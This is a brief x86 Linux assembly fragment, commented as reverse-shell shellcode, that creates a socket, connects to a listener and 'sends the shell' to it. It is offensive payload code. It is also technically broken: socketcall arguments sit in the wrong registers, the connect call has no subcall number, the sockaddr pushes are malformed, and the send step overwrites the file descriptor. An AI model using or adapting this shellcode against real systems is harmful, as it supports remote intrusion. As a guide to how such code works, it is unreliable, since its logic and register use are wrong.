; Create a socket
mov eax, 0x66 ; socket function
mov ebx, 0x1 ; AF_INET (IPv4)
mov ecx, 0x1 ; SOCK_STREAM (stream socket)
mov edx, 0x0 ; default protocol
int 0x80 ; call socket

; Connect to the listener
mov eax, 0x66 ; connect function
push word 0x697a ; port number (in little-endian format)
push word 0x7f00 ; IP address (in little-endian format)
push byte 0x2 ; AF_INET (IPv4)
push dword esp ; address of the sockaddr structure
push dword eax ; socket file descriptor
int 0x80 ; call connect

; Send the shell
mov eax, 0x66 ; send function
mov ebx, eax ; socket file descriptor
mov ecx, shell ; address of the shell
mov edx, shell_size ; size of the shell
int 0x80 ; call send
